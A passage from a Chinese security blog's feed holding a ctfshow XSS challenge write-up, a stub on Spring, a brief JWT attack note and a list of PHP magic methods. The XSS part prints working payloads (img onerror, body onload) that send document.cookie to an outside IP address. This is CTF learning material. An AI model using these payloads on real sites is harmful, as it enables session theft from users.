top.location.href&#125;catch(e)&#123;return&#x27;&#x27;&#125;&#125;)())+&#x27;&amp;cookie=&#x27;+escape((function()&#123;try&#123;return document.cookie&#125;catch(e)&#123;return&#x27;&#x27;&#125;&#125;)())+&#x27;&amp;opener=&#x27;+escape((function()&#123;try&#123;return(window.opener&amp;&amp;window.opener.location.href)?window.opener.location.href:&#x27;&#x27;&#125;catch(e)&#123;return&#x27;&#x27;&#125;&#125;)());&#125;)();</span><br></pre></td></tr></table></figure></div><p>不会的喵</p><h2 id="web317"><a href="#web317" class="headerlink" title="web317"></a>web317</h2><p>过滤了script<br>我们考虑img标签</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=&quot;&quot; onerror=location.href=&quot;http://47.115.221.235:1234/index.php?cookie=&quot;+document.cookie&gt;</span><br></pre></td></tr></table></figure></div><h2 id="web318-319"><a href="#web318-319" class="headerlink" title="web318-319"></a>web318-319</h2><p>又过滤了img<br>我们考虑body</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;body onload=location.href=&quot;http://47.115.221.235:1234/index.php?cookie=&quot;+document.cookie&gt;</span><br></pre></td></tr></table></figure></div><h2 id="web320-326"><a href="#web320-326" class="headerlink" title="web320-326"></a>web320-326</h2><p>过滤了空格</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;body/onload=location.href=&quot;http://47.115.221.235:1234/index.php?cookie=&quot;+document.cookie&gt;</span><br></pre></td></tr></table></figure></div>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="XSS" scheme="http://example.com/categories/XSS/"/>
    
    
    <category term="web" scheme="http://example.com/tags/web/"/>
    
    <category term="ctfshow" scheme="http://example.com/tags/ctfshow/"/>
    
  </entry>
  
  <entry>
    <title>spring学习</title>
    <link href="http://example.com/2025/03/16/java/sping/spring%E5%AD%A6%E4%B9%A0/"/>
    <id>http://example.com/2025/03/16/java/sping/spring%E5%AD%A6%E4%B9%A0/</id>
    <published>2025-03-16T15:51:00.000Z</published>
    <updated>2025-04-05T11:38:59.690Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="研究中"><a href="#研究中" class="headerlink" title="研究中"></a>研究中</h1>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="java" scheme="http://example.com/categories/java/"/>
    
    
    <category term="java" scheme="http://example.com/tags/java/"/>
    
    <category term="spring" scheme="http://example.com/tags/spring/"/>
    
    <category term="framework" scheme="http://example.com/tags/framework/"/>
    
  </entry>
  
  <entry>
    <title>jwt</title>
    <link href="http://example.com/2025/03/10/web/jwt/jwt/"/>
    <id>http://example.com/2025/03/10/web/jwt/jwt/</id>
    <published>2025-03-10T20:20:52.000Z</published>
    <updated>2025-04-05T11:38:59.691Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="JWT简介"><a href="#JWT简介" class="headerlink" title="JWT简介"></a>JWT简介</h2><p>JWT即Json Web Token的缩写，顾名思义，是Token的一种。它常被用来在向服务器发起请求时用作身份认证。使用JWT作为身份认证的优势在于：它不需要在服务端去保留用户的认证信息。仅需要对该Token正确性进行校验即可,这就意味着基于token认证机制的应用,不需要去考虑用户在哪一台服务器登录了，为应用的扩展提供了便利。</p><p>新技术带来便利的同时也会带来新的安全问题，如果JWT本身安全存在问题，那么整个身份认证机制就会得不到保障。</p><p>JWT由三部分组成，类似于xxx.yyy.zzz，前两部分是base64编码的内容，第三部分是加密的签名部分</p><h3 id="弱签名算法（无算法）"><a href="#弱签名算法（无算法）" class="headerlink" title="弱签名算法（无算法）"></a>弱签名算法（无算法）</h3><p>更改头部中声明的加密算法</p><h3 id="弱密码"><a href="#弱密码" class="headerlink" title="弱密码"></a>弱密码</h3><p>如果JWT使用HS系列(对称加密)的加密方法，而且使用较为简单的Key进行加密，那么使用工具就极有可能能够得到key,之后就可以随意的篡改JWT了。<br>jwt_tool&lt;-是个好东西。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="jwt" scheme="http://example.com/categories/jwt/"/>
    
    
    <category term="web" scheme="http://example.com/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>php反序列化</title>
    <link href="http://example.com/2025/03/08/web/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E9%AD%94%E6%B3%95%E5%87%BD%E6%95%B0/"/>
    <id>http://example.com/2025/03/08/web/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E9%AD%94%E6%B3%95%E5%87%BD%E6%95%B0/</id>
    <published>2025-03-08T20:13:52.000Z</published>
    <updated>2025-04-05T11:38:59.691Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">__construct()，类的构造函数</span><br><span class="line"></span><br><span class="line">__destruct()，类的析构函数</span><br><span class="line"></span><br><span class="line">__call()，在对象中调用一个不可访问方法时调用</span><br><span class="line"></span><br><span class="line">__callStatic()，用静态方式中调用一个不可访问方法时调用</span><br><span class="line"></span><br><span class="line">__get()，获得一个类的成员变量时调用</span><br><span class="line"></span><br><span class="line">__set()，设置一个类的成员变量时调用</span><br><span class="line"></span><br><span class="line">__isset()，当对不可访问属性调用isset()或empty()时调用</span><br><span class="line"></span><br><span class="line">__unset()，当对不可访问属性调用unset()时被调用。</span><br><span class="line"></span><br><span class="line">__sleep()，执行serialize()时，先会调用这个函数</span><br><span class="line"></span><br><span class="line">__wakeup()，执行unserialize()时，先会调用这个函数</span><br><span class="line"></span><br><span class="line">__toString()，类被当成字符串时的回应方法</span><br><span class="line"></span><br><span class="line">__invoke()，调用函数的方式调用一个对象时的回应方法</span><br><span class="line"></span><br><span class="line">__set_state()，调用var_export()导出类时，此静态方法会被调用。</span><br><span class="line"></span><br><span class="line">__clone()，当对象复制完成时调用</span><br><span class="line"></span><br><span class="line">__autoload()，尝试加载未定义的类</span><br><span class="line"></span><br><span class="line">__debugInfo()，打印所需调试信息</span><br></pre></td></tr></table></figure></div>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="php反序列化" scheme="http://example.com/categories/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
    
    <category term="web" scheme="http://example.com/tags/web/"/>
    
    <category term="php" scheme="http://example.com/tags/php/"/>
    
  </entry>
  
</feed>
